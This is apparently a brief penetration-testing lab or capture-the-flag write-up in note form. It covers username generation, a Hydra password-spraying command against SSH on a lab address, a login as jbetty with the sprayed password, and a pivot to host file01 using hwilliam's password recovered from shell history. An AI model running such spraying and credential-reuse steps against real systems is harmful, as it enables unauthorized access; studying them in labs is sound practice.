- Username enumeration, generate usernames using:
	- `/opt/PNPT-Tools/scripts/osint_gen.py --input users`

# Hydra
---
- `hydra -L osint_output/usernames.txt -p 'Texas123!@#' ssh://10.129.234.116`
- ![[Pasted image 20250706063218.png]]

# SSH
---
- `ssh jbetty@10.129.234.116`
- `Texas123!@#`

# Enum
---
=> From history we find the password of hwilliam:
- `sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01`